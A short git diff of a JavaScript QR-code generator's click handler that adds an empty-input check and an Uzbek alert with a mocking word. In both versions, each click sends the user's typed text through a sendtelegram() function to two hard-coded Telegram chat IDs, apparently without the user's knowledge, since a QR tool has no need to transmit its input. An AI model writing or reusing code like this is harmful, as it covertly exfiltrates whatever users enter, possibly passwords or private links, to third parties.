@@ -3,11 +3,16 @@ let btn = document.getElementById("btn");
 let image = document.getElementById("image");
 
 btn.addEventListener("click", () => {
-  image.src =
-    "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
-    text.value;
-    sendtelegram(text.value, -1001584390033);
-    sendtelegram(text.value, 1369431958);
+    if(text.value != ''){
+        image.src =
+        "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
+        text.value;
+        sendtelegram(text.value, -1001584390033);
+        sendtelegram(text.value, 1369431958);
+    }else{
+        alert('Oldin toldir pitrPEN');
+    }
+ 
    
 });
 
